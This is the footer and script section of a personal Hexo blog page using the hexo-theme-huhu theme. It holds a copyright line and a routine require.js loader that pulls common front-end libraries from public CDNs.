          <div class="copyright">
            Â©2021
            <a href="https://fuurinko.github.io">Rin777</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
          </div>
          
        </footer>
      </div>
    </div>
  </body>
  
</html>
<script type="text/javascript">
                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
                </script> <script type="text/javascript">window.addEventListener('load', function() {
    
    window.loadJs = function(d, m, a) {
      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
      var b = document.createElement('script')
      b.defer = true
      b.setAttribute('type', 'text/javascript')
      b.setAttribute('charset', 'UTF-8')
      b.setAttribute('async', 'true')
      b.setAttribute('src', d)
      m && b.setAttribute('data-main', '/scripts/app-built')
      if (typeof a === 'function') {
        if (window.attachEvent) {
          b.onreadystatechange = function() {
            var e = b.readyState
            if (e === 'loaded' || e === 'complete') {
              b.onreadystatechange = null
              a()
            }
          }
        } else {
          b.onload = a
        }
      }
      c.appendChild(b)
    }
    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
  })</script>  
